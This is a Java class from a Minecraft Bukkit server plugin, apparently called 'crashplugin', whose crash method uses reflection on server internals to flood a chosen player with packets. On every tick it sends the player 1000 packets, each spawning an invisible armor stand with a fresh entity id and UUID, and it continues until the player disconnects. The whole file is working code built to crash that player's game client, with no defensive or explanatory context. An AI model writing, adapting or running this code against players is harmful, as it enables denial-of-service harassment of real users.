package net.teamfruit.crashplugin;

import org.bukkit.Location;
import org.bukkit.entity.Player;
import org.bukkit.scheduler.BukkitRunnable;

import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Random;
import java.util.UUID;
import java.util.concurrent.ThreadLocalRandom;
import java.util.logging.Level;

public class CrashLogic {

    private Class<?> $ChatMessage = NMSUtils.getNMSServerClass("ChatMessage");
    private Class<?> $Entity = NMSUtils.getNMSServerClass("Entity");
    private Class<?> $EntityLiving = NMSUtils.getNMSServerClass("EntityLiving");
    private Class<?> $EntityArmorStand = NMSUtils.getNMSServerClass("EntityArmorStand");
    private Class<?> $EntityTypes = NMSUtils.getNMSServerClass("EntityTypes");
    private Class<?> $PacketPlayOutSpawnEntityLiving = NMSUtils.getNMSServerClass("PacketPlayOutSpawnEntityLiving");
    private Class<?> $World = NMSUtils.getNMSServerClass("World");
    private Class<?> $EntityPlayer = NMSUtils.getNMSServerClass("EntityPlayer");
    private Class<?> $PlayerConnection = NMSUtils.getNMSServerClass("PlayerConnection");
    private Class<?> $Packet = NMSUtils.getNMSServerClass("Packet");
    private Class<?> $IChatBaseComponent = NMSUtils.getNMSServerClass("IChatBaseComponent");
    private Class<?> $CraftWorld = NMSUtils.getNMSBukkitClass("CraftWorld");
    private Class<?> $CraftPlayer = NMSUtils.getNMSBukkitClass("entity.CraftPlayer");

    private Constructor<?> $EntityArmorStand$new = NMSUtils.getConstructor($EntityArmorStand, $EntityTypes, $World);
    private Constructor<?> $ChatMessage$new = NMSUtils.getConstructor($ChatMessage, String.class, Object[].class);
    private Constructor<?> $PacketPlayOutSpawnEntityLiving$new = NMSUtils.getConstructor($PacketPlayOutSpawnEntityLiving, $EntityLiving);

    private Field $EntityPlayer$playerConnection = NMSUtils.getField($EntityPlayer, "playerConnection");
    private Field $EntityTypes$ARMOR_STAND = NMSUtils.getField($EntityTypes, "ARMOR_STAND");
    private Field $Entity$id = NMSUtils.getPrivateField($Entity, "id");

    private Method $CraftWorld$getHandle = NMSUtils.getMethod($CraftWorld, "getHandle");
    private Method $CraftPlayer$getHandle = NMSUtils.getMethod($CraftPlayer, "getHandle");
    private Method $EntityArmorStand$setLocation = NMSUtils.getMethod($EntityArmorStand, "setLocation", double.class, double.class, double.class, float.class, float.class);
    private Method $EntityArmorStand$setCustomName = NMSUtils.getMethod($EntityArmorStand, "setCustomName", $IChatBaseComponent);
    private Method $EntityArmorStand$setCustomNameVisible = NMSUtils.getMethod($EntityArmorStand, "setCustomNameVisible", boolean.class);
    private Method $EntityArmorStand$setInvisible = NMSUtils.getMethod($EntityArmorStand, "setInvisible", boolean.class);
    private Method $PlayerConnection$sendPacket = NMSUtils.getMethod($PlayerConnection, "sendPacket", $Packet);
    private Method $Entity$setUUID = NMSUtils.getMethod($Entity, "setUUID", UUID.class);

    private static UUID nextUUID(Random random) {
        long most = random.nextLong() & -61441L | 16384L;
        long least = random.nextLong() & 4611686018427387903L | -9223372036854775808L;
        return new UUID(most, least);
    }

    public void crash(Player p) {
        final Location loc = p.getLocation();
        new BukkitRunnable() {
            public void run() {
                try {
                    Object s = $CraftWorld$getHandle.invoke(loc.getWorld());
                    Object stand = $EntityArmorStand$new.newInstance($EntityTypes$ARMOR_STAND.get(null), s);
                    $EntityArmorStand$setLocation.invoke(stand, loc.getX(), loc.getY() + 3.0D, loc.getZ(), 0.0F, 0.0F);
                    $EntityArmorStand$setCustomName.invoke(stand, $ChatMessage$new.newInstance("CRASH!", new Object[0]));
                    $EntityArmorStand$setCustomNameVisible.invoke(stand, false);
                    $EntityArmorStand$setInvisible.invoke(stand, true);
                    int id = (int) $Entity$id.get(stand);
                    Random random = ThreadLocalRandom.current();
                    for (int i = 0; i < 1000; i++) {
                        $Entity$id.set(stand, id + i);
                        $Entity$setUUID.invoke(stand, nextUUID(random));
                        Object packet = $PacketPlayOutSpawnEntityLiving$new.newInstance(stand);
                        $PlayerConnection$sendPacket.invoke($EntityPlayer$playerConnection.get($CraftPlayer$getHandle.invoke(p)), packet);
                    }
                } catch (ReflectiveOperationException e) {
                    CrashPlugin.logger.log(Level.SEVERE, "NMS Error", e);
                    cancel();
                }

                if (!p.isOnline())
                    cancel();
            }
        }.runTaskTimer(CrashPlugin.plugin, 1L, 1L);
    }

}
